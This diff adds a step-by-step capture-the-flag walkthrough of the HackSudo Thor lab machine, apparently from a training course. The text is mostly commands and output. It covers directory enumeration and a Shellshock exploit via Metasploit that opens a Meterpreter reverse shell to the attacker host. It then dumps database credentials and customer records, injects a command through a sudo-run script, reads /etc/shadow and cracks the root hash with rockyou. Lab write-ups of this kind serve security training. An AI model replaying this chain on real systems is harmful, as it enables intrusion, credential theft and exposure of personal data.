@@ -1,0 +1,277 @@
+1.
+
+2. check directories: 
+kali@kali:~/SF/module23$ dirb http://10.8.0.10
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Apr 10 12:22:06 2023
+URL_BASE: http://10.8.0.10/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://10.8.0.10/ ----
++ http://10.8.0.10/cgi-bin/ (CODE:403|SIZE:274)                                                                                                                                         
+==> DIRECTORY: http://10.8.0.10/fonts/                                                                                                                                                  
+==> DIRECTORY: http://10.8.0.10/images/                                                                                                                                                 
++ http://10.8.0.10/index.php (CODE:200|SIZE:5357)                                                                                                                                       
++ http://10.8.0.10/server-status (CODE:403|SIZE:274)                                                                                                                                    
+                                                                                                                                                                                        
+---- Entering directory: http://10.8.0.10/fonts/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                                                                                                                                        
+---- Entering directory: http://10.8.0.10/images/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.                        
+    (Use mode '-w' if you want to scan it anyway)
+                                                                               
+-----------------
+END_TIME: Mon Apr 10 12:26:15 2023
+DOWNLOADED: 4612 - FOUND: 3
+kali@kali:~/SF/module23$ dirb http://10.8.0.10/cgi-bin /usr/share/dirb/wordlists/small.txt -X .sh
+
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Apr 10 12:28:26 2023
+URL_BASE: http://10.8.0.10/cgi-bin/
+WORDLIST_FILES: /usr/share/dirb/wordlists/small.txt
+EXTENSIONS_LIST: (.sh) | (.sh) [NUM = 1]
+
+-----------------
+
+GENERATED WORDS: 959                                                           
+
+---- Scanning URL: http://10.8.0.10/cgi-bin/ ----
++ http://10.8.0.10/cgi-bin/shell.sh (CODE:500|SIZE:607)                                                                                                                                 
+
+
+3. msftconsole to check the shecllshock
+
+msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > 
+msf6 auxiliary(scanner/http/apache_mod_cgi_bash_env) > use exploit/multi/http/apache_mod_cgi_bash_env_exec
+[*] Using configured payload linux/x86/meterpreter/reverse_tcp
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.8.0.10
+RHOSTS => 10.8.0.10
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /server-status
+TARGETURI => /server-status
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > show payloads
+
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > check
+[*] 10.8.0.10:80 - The target is not exploitable.
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/shell.sh
+TARGETURI => /cgi-bin/shell.sh
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > check
+[+] 10.8.0.10:80 - The target is vulnerable.
+
+
+
+4. shelshock console
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > exploit
+
+[*] Started reverse TCP handler on 10.8.0.3:4444 
+[*] Command Stager progress - 100.46% done (1097/1092 bytes)
+[*] Sending stage (1017704 bytes) to 10.8.0.1
+[*] Meterpreter session 1 opened (10.8.0.3:4444 -> 10.8.0.1:40770) at 2023-04-10 12:30:14 -0400
+
+
+meterpreter > shell
+Process 2031 created.
+Channel 8 created.
+
+/usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
+bash-4.3$ ls
+
+ls
+html
+bash-4.3$ cd html
+cd html
+bash-4.3$ ls
+ls
+README.md                    fonts
+action_style.css             fonts.css
+add_beneficiary.php          header.php
+
+
+
+
+5.  bash-4.3$ cat connect.php
+cat connect.php
+<?php
+$servername = "localhost";
+// Enter your MySQL username below(default=root)
+$username = "thor";
+// Enter your MySQL password below
+$password = "password";
+$dbname = "hacksudo";
+
+6. check DB
+
+MariaDB [(none)]> use hacksudo
+#use hacksudo
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+MariaDB [hacksudo]> 
+#
+MariaDB [hacksudo]> 
+
+MariaDB [hacksudo]> sh tables;
+sh tables;
+ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'sh tables' at line 1
+MariaDB [hacksudo]> show tables;
+show tables;
++--------------------+
+| Tables_in_hacksudo |
++--------------------+
+| admin              |
+| beneficiary1       |
+| beneficiary2       |
+| beneficiary3       |
+| beneficiary4       |
+| customer           |
+| news               |
+| news_body          |
+| passbook1          |
+| passbook2          |
+| passbook3          |
+| passbook4          |
++--------------------+
+12 rows in set (0.001 sec)
+
+MariaDB [hacksudo]> select * from admin;
+select * from admin;
++----+-------+-------------+
+| id | uname | pwd         |
++----+-------+-------------+
+|  1 | admin | password123 |
++----+-------+-------------+
+1 row in set (0.001 sec)
+
+MariaDB [hacksudo]> select * from customer;
+select * from customer;
++---------+------------+------------+--------+------------+-----------+------------------------+----------------+--------------------------------------------------------------------------+---------+------------+------+---------+-----------+
+| cust_id | first_name | last_name  | gender | dob        | aadhar_no | email                  | phone_no       | address                                                                  | branch  | account_no | pin  | uname   | pwd       |
++---------+------------+------------+--------+------------+-----------+------------------------+----------------+--------------------------------------------------------------------------+---------+------------+------+---------+-----------+
+|       1 | Nafees     | Zakee      | male   | 1994-11-28 | 123456789 | zakee.nafees@gmail.com | +91 8918722499 | 22/10, Secondary Road, Durgapur - 713204                                 | delhi   | 1122334455 | 1234 | zakee94 | nafees123 |
+|       2 | Md Salman  | Ali        | male   | 1994-10-11 | 987654321 | ali.salman@gmail.com   | +966 895432167 | Al Ahsa Street Malaz, King Abdulaziz Rd, Alamal Dist. RIYADH 12643-2121. | riyadh  | 1133557788 | 1234 | salman  | salman123 |
+|       3 | Tushar     | Kr. Pandey | male   | 1995-02-03 | 125656765 | tusharpkt@gmail.com    | +334 123456987 | Champ de Mars, 
+5 Avenue Anatole France, 
+75007 Paris, France          | paris   | 1122338457 | 1357 | tushar  | tushar123 |
+|       4 | Jon        | Snow       | male   | 1985-02-03 | 129156787 | jon.snow@gmail.com     | +1 8918332797  | The Night Watch,
+King in the North,
+The North Remembers,
+Westeros.    | newyork | 1233556739 | 1234 | jon     | snow123   |
++---------+------------+------------+--------+------------+-----------+------------------------+----------------+--------------------------------------------------------------------------+---------+------------+------+---------+-----------+
+4 rows in set (0.001 sec)
+
+
+ 
+7. admin URL
+http://10.8.0.10/admin_login.php
+admin/password123
+
+got access to ADMIN page and to all customers
+ 
+
+8. sudo -l
+Matching Defaults entries for www-data on HackSudoThor:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on HackSudoThor:
+    (thor) NOPASSWD: /home/thor/./hammer.sh
+
+
+bash-4.3$ sudo -u thor /home/thor/./hammer.sh
+sudo -u thor /home/thor/./hammer.sh
+
+HELLO want to talk to Thor?
+
+Enter Thor  Secret Key : fdfdfdf
+fdfdfdf
+Hey Dear ! I am fdfdfdf , Please enter your Secret massage : hgfhgfhgf
+hgfhgfhgf
+Thank you for your precious time!
+
+9. 
+bash-4.3$ sudo -u thor /home/thor/./hammer.sh
+sudo -u thor /home/thor/./hammer.sh
+
+HELLO want to talk to Thor?
+
+Enter Thor  Secret Key : test
+test
+Hey Dear ! I am test , Please enter your Secret massage : ls
+ls
+backup.cgi  shell.sh  vishal.sh
+Thank you for your precious time!
+bash-4.3$ sudo -u thor /home/thor/./hammer.sh
+sudo -u thor /home/thor/./hammer.sh
+
+HELLO want to talk to Thor?
+
+Enter Thor  Secret Key : test
+test
+Hey Dear ! I am test , Please enter your Secret massage : bash
+bash
+/usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
+/usr/bin/python -c 'import pty;pty.spawn("/bin/bash")'
+thor@HacksudoThor:/usr/lib/cgi-bin$ 
+
+10. 
+thor@HacksudoThor:~$ sudo -l
+sudo -l
+Matching Defaults entries for thor on HackSudoThor:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User thor may run the following commands on HackSudoThor:
+    (root) NOPASSWD: /usr/bin/cat, /usr/sbin/service
+thor@HacksudoThor:~$ sudo /usr/bin/cat /etc/shadow
+sudo /usr/bin/cat /etc/shadow
+root:$6$oYx/0InUPemDrMYf$UqYjz7YRV.4pZKAtLcQE7Xabkwz46FXCPVAQBn6YKcULCgPzONwbqk2YWSjFsiwSxYRt6oHUBF3i76O4hm6Lm.:19435:0:99999:7:::
+daemon:*:18789:0:99999:7:::
+
+11. 
+kali@kali:~/SF/module23$ john --wordlist=/usr/share/wordlists/rockyou.txt passwd 
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 SSE2 2x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+123456           (root)     
+1g 0:00:00:00 DONE (2023-04-10 17:57) 8.333g/s 1066p/s 1066c/s 1066C/s 123456..diamond
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+12. 
+thor@HacksudoThor:~$ su -
+su -
+Password: 123456
+
+root@HacksudoThor:~# ls
+ls
+flag.txt       openvpn_2.4.4-2ubuntu1.7_amd64.deb  root.txt
+lab_23_5.ovpn  proof.txt
+root@HacksudoThor:~# ls -ltr
+ls -ltr
+total 480
+-rw-r--r-- 1 root root   7134 Jul 30  2021 proof.txt
+-rw------- 1 root root      7 Aug  2  2021 root.txt
+-rw-r--r-- 1 root root 469712 Mar 24  2022 openvpn_2.4.4-2ubuntu1.7_amd64.deb
+-rw-r--r-- 1 root root   2771 Mar 19 07:10 lab_23_5.ovpn
+-rw-r--r-- 1 root root     33 Mar 19 07:23 flag.txt
+root@HacksudoThor:~# cat flag.txt
+cat flag.txt
+Flag{bG9DdpZUZlNWNoaTRpZWs4bGEK}
